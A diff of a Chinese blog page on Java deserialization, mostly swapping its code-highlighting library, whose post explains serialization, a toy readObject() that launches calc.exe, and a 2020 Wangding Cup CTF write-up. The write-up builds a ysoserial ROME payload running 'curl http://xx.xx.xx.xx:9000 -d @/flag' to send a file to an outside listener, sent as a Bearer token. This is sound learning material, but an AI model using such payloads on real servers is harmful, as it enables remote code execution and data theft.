@@ -29,15 +29,7 @@
     
     
       
-      
-        
-          
-          
-          
-        
-        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
-      
-      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
     
   
 
@@ -61,6 +53,7 @@
 <!-- 自定义样式保持在最底部 -->
 
   
+<link rel="stylesheet" href="/css/mac.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/shubiao.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/toubudaziji.css">
@@ -69,7 +62,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"always","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -199,7 +192,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      885 字
+      917 字
     </span>
   
 
@@ -209,7 +202,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      26
+      13
        分钟
     </span>
   
@@ -245,121 +238,127 @@
             <!-- SEO header -->
             <h1 style="display: none">Java反序列化</h1>
             
+              <p class="note note-info">
+                
+                  本文最后更新于：3 个月前
+                
+              </p>
+            
             <div class="markdown-body">
               <h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>一个类要想能够被序列化和反序列化，必须实现<code>Serializable</code>接口</p>
 <p><code>java.io.ObjectOutputStream</code>代表对象输出流，它的<code>writeObject(Object obj)</code>方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。</p>
 <p><code>java.io.ObjectInputStream</code>代表对象输入流，它的<code>readObject()</code>方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。</p>
 <p>示例：<br><code>User.java</code></p>
-<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">serialize</span><span class="token punctuation">;</span>
+<div class="hljs"><pre><code class="hljs java"><span class="hljs-keyword">package</span> serialize;
 
-<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span><span class="token punctuation">;</span>
+<span class="hljs-keyword">import</span> java.io.Serializable;
 
-<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span><span class="token punctuation">&#123;</span>
-	<span class="token comment">/**
-	 * 序列化ID
-	 */</span>
-	<span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1184442687843856690L</span><span class="token punctuation">;</span>
-	<span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
-	<span class="token keyword">private</span> <span class="token class-name">String</span> address<span class="token punctuation">;</span>
-	<span class="token keyword">private</span> <span class="token class-name">String</span> telphone<span class="token punctuation">;</span>
-	<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-		<span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token operator">=</span>name<span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span>
-	<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAddress</span><span class="token punctuation">(</span><span class="token class-name">String</span> address<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-		<span class="token keyword">this</span><span class="token punctuation">.</span>address<span class="token operator">=</span>address<span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span>
-	<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setTel</span><span class="token punctuation">(</span><span class="token class-name">String</span> telphone<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-		<span class="token keyword">this</span><span class="token punctuation">.</span>telphone<span class="token operator">=</span>telphone<span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span>
-	<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-		<span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span>
-	<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-		<span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>address<span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span>
-	<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getTel</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-		<span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>telphone<span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span>
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span></span>&#123;
+	<span class="hljs-comment">/**</span>
+<span class="hljs-comment">	 * 序列化ID</span>
+<span class="hljs-comment">	 */</span>
+	<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = -<span class="hljs-number">1184442687843856690L</span>;
+	<span class="hljs-keyword">private</span> String name;
+	<span class="hljs-keyword">private</span> String address;
+	<span class="hljs-keyword">private</span> String telphone;
+	<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;
+		<span class="hljs-keyword">this</span>.name=name;
+	&#125;
+	<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setAddress</span><span class="hljs-params">(String address)</span> </span>&#123;
+		<span class="hljs-keyword">this</span>.address=address;
+	&#125;
+	<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setTel</span><span class="hljs-params">(String telphone)</span> </span>&#123;
+		<span class="hljs-keyword">this</span>.telphone=telphone;
+	&#125;
+	<span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;
+		<span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.name;
+	&#125;
+	<span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getAddress</span><span class="hljs-params">()</span> </span>&#123;
+		<span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.address;
+	&#125;
+	<span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getTel</span><span class="hljs-params">()</span> </span>&#123;
+		<span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.telphone;
+	&#125;
 
-<span class="token punctuation">&#125;</span></code></pre>
+&#125;</code></pre></div>
 <p><code>TestSerialize.java</code></p>
-<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">serialize</span><span class="token punctuation">;</span>
+<div class="hljs"><pre><code class="hljs java"><span class="hljs-keyword">package</span> serialize;
 
-<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span><span class="token class-name">MessageFormat</span><span class="token punctuation">;</span>
+<span class="hljs-keyword">import</span> java.io.*;
+<span class="hljs-keyword">import</span> java.text.MessageFormat;
 
-<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestSerialize</span> <span class="token punctuation">&#123;</span>
-	<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ar<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
-		<span class="token class-name">SerializeTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		<span class="token class-name">User</span> user<span class="token operator">=</span><span class="token class-name">Deserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">MessageFormat</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"name=&#123;0&#125;,address=&#123;1&#125;,telphone=&#123;2&#125;"</span><span class="token punctuation">,</span> user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>user<span class="token punctuation">.</span><span class="token function">getAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>user<span class="token punctuation">.</span><span class="token function">getTel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span>
-	<span class="token comment">//序列化</span>
-	<span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">SerializeTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
-		<span class="token class-name">User</span> user<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		user<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"1_/\\/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		user<span class="token punctuation">.</span><span class="token function">setTel</span><span class="token punctuation">(</span><span class="token string">"12138"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		user<span class="token punctuation">.</span><span class="token function">setAddress</span><span class="token punctuation">(</span><span class="token string">"芜湖市"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		<span class="token class-name">FileOutputStream</span> fo<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		<span class="token class-name">ObjectOutputStream</span> oo<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fo<span class="token punctuation">)</span><span class="token punctuation">;</span>
-		oo<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
-		<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Serialize success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		oo<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		fo<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span>
-	<span class="token comment">//反序列化</span>
-	<span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">User</span> <span class="token class-name">Deserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
-		<span class="token class-name">FileInputStream</span> fi<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		<span class="token class-name">ObjectInputStream</span> ois<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fi<span class="token punctuation">)</span><span class="token punctuation">;</span>
-		<span class="token class-name">User</span> user<span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">User</span><span class="token punctuation">)</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Deserialize seccess!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		ois<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		fi<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		<span class="token keyword">return</span> user<span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span>
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestSerialize</span> </span>&#123;
+	<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] ar)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;
+		SerializeTest();
+		User user=Deserialize();
+		System.out.println(MessageFormat.format(<span class="hljs-string">&quot;name=&#123;0&#125;,address=&#123;1&#125;,telphone=&#123;2&#125;&quot;</span>, user.getName(),user.getAddress(),user.getTel()));
+	&#125;
+	<span class="hljs-comment">//序列化</span>
+	<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SerializeTest</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;
+		User user=<span class="hljs-keyword">new</span> User();
+		user.setName(<span class="hljs-string">&quot;1_/\\/&quot;</span>);
+		user.setTel(<span class="hljs-string">&quot;12138&quot;</span>);
+		user.setAddress(<span class="hljs-string">&quot;芜湖市&quot;</span>);
+		FileOutputStream fo=<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;test.txt&quot;</span>);
+		ObjectOutputStream oo=<span class="hljs-keyword">new</span> ObjectOutputStream(fo);
+		oo.writeObject(user);
+		System.out.println(<span class="hljs-string">&quot;Serialize success!&quot;</span>);
+		oo.close();
+		fo.close();
+	&#125;
+	<span class="hljs-comment">//反序列化</span>
+	<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> User <span class="hljs-title">Deserialize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;
+		FileInputStream fi=<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;test.txt&quot;</span>);
+		ObjectInputStream ois=<span class="hljs-keyword">new</span> ObjectInputStream(fi);
+		User user=(User)ois.readObject();
+		System.out.println(<span class="hljs-string">&quot;Deserialize seccess!&quot;</span>);
+		ois.close();
+		fi.close();
+		<span class="hljs-keyword">return</span> user;
+	&#125;
 
-<span class="token punctuation">&#125;</span></code></pre>
+&#125;</code></pre></div>
 <p>运行<code>TestSerialize.java</code>，输出：</p>
-<pre><code>Serialize success!
+<div class="hljs"><pre><code>Serialize success!
 Deserialize seccess!
-name=1_/\/,address=芜湖市,telphone=12138</code></pre>
+name=1_/\/,address=芜湖市,telphone=12138</code></pre></div>
 <p>得到的文件<code>test.txt</code><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201191927648.png" srcset="/img/loading.gif"></p>
 <p>对文件内容进行base64加密<br><code>rO0ABXNyAA5zZXJpYWxpemUuVXNlcu+QA6aeQg7OAgADTAAHYWRkcmVzc3QAEkxqYXZhL2xhbmcvU3RyaW5nO0wABG5hbWVxAH4AAUwACHRlbHBob25lcQB+AAF4cHQACeiKnOa5luW4gnQABTFfL1wvdAAFMTIxMzg=</code></p>
 <p>rO0AB—序列化后base64都以此开头</p>
 <h2 id="一个简单的反序列化漏洞"><a href="#一个简单的反序列化漏洞" class="headerlink" title="一个简单的反序列化漏洞"></a>一个简单的反序列化漏洞</h2><p>Java反序列化会调用<code>readObject()</code>方法，当这个方法使用不当时，可能引起漏洞利用</p>
-<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">serialize2</span><span class="token punctuation">;</span>
+<div class="hljs"><pre><code class="hljs java"><span class="hljs-keyword">package</span> serialize2;
 
-<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span>
+<span class="hljs-keyword">import</span> java.io.*;
 
-<span class="token keyword">public</span> <span class="token keyword">class</span> test <span class="token punctuation">&#123;</span>
-	<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ar<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
-		<span class="token class-name">UnsafeClass</span> <span class="token class-name">Unsafe</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UnsafeClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token class-name">Unsafe</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"hack"</span><span class="token punctuation">;</span>
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span> </span>&#123;
+	<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] ar)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;
+		UnsafeClass Unsafe = <span class="hljs-keyword">new</span> UnsafeClass();
+        Unsafe.name = <span class="hljs-string">&quot;hack&quot;</span>;
 
-        <span class="token class-name">FileOutputStream</span> fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token class-name">ObjectOutputStream</span> os <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fos<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token comment">//writeObject()方法将Unsafe对象写入object文件</span>
-        os<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span><span class="token class-name">Unsafe</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        os<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token comment">//从文件中反序列化obj对象</span>
-        <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fis<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token comment">//恢复对象</span>
-        <span class="token class-name">UnsafeClass</span> objectFromDisk <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">UnsafeClass</span><span class="token punctuation">)</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>objectFromDisk<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        ois<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token keyword">class</span> <span class="token class-name">UnsafeClass</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
-    <span class="token comment">//重写readObject()方法</span>
-    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span><span class="token class-name">ObjectInputStream</span> in<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">&#123;</span>
-        <span class="token comment">//执行默认的readObject()方法</span>
-        in<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token comment">//执行命令</span>
-        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span></code></pre>
+        FileOutputStream fos = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;test.txt&quot;</span>);
+        ObjectOutputStream os = <span class="hljs-keyword">new</span> ObjectOutputStream(fos);
+        <span class="hljs-comment">//writeObject()方法将Unsafe对象写入object文件</span>
+        os.writeObject(Unsafe);
+        os.close();
+        <span class="hljs-comment">//从文件中反序列化obj对象</span>
+        FileInputStream fis = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;test.txt&quot;</span>);
+        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(fis);
+        <span class="hljs-comment">//恢复对象</span>
+        UnsafeClass objectFromDisk = (UnsafeClass)ois.readObject();
+        System.out.println(objectFromDisk.name);
+        ois.close();
+    &#125;
+&#125;
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UnsafeClass</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span></span>&#123;
+    <span class="hljs-keyword">public</span> String name;
+    <span class="hljs-comment">//重写readObject()方法</span>
+    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException</span>&#123;
+        <span class="hljs-comment">//执行默认的readObject()方法</span>
+        in.defaultReadObject();
+        <span class="hljs-comment">//执行命令</span>
+        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);
+    &#125;
+&#125;</code></pre></div>
 <p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201192008461.png" srcset="/img/loading.gif"></p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Fluorescence-tjy/p/11222052.html">Java反序列化漏洞从入门到深入</a></p>
 <h2 id="2020-网鼎杯-朱雀组-web-think-java"><a href="#2020-网鼎杯-朱雀组-web-think-java" class="headerlink" title="2020-网鼎杯-朱雀组-web-think_java"></a>2020-网鼎杯-朱雀组-web-think_java</h2><p>给了几个class文件<br><code>Java Decompiler</code>反编译一下</p>
@@ -381,12 +380,12 @@ name=1_/\/,address=芜湖市,telphone=12138</code></pre>
 <p>使用<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial"><code>ysoserial</code></a>生成payload</p>
 <p><code>java -jar ysoserial-master-8eb5cbfbf6-1.jar ROME &quot;curl http://xx.xx.xx.xx:9000 -d @/flag&quot; &gt; 123.bin</code></p>
 <p>对<code>123.bin</code>中的内容base64编码</p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
-f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"123.bin"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span>
-pay<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
-txt1<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Bearer "</span><span class="token operator">+</span>txt1<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64
+f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;123.bin&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)
+pay=f.read()
+txt1=base64.b64encode(pay)
+print(<span class="hljs-string">&quot;Bearer &quot;</span>+txt1.decode(<span class="hljs-string">&quot;utf-8&quot;</span>))
+f.close()</code></pre></div>
 <p><code>/common/user/current</code></p>
 <p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201192154930.png" srcset="/img/loading.gif"><br>监听端口即可得到flag<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201192211664.png" srcset="/img/loading.gif"></p>
 
@@ -520,7 +519,7 @@ f<span class="token punctuation">.</span>close<span class="token punctuation">(<
   <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
 
   <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.configure({"showSpinner":true,"trickleSpeed":200})
     NProgress.start()
     document.addEventListener('DOMContentLoaded', function() {
       window.NProgress && window.NProgress.inc();
@@ -546,8 +545,6 @@ f<span class="token punctuation">.</span>close<span class="token punctuation">(<
 
 
 
-  
-    
   
 
 
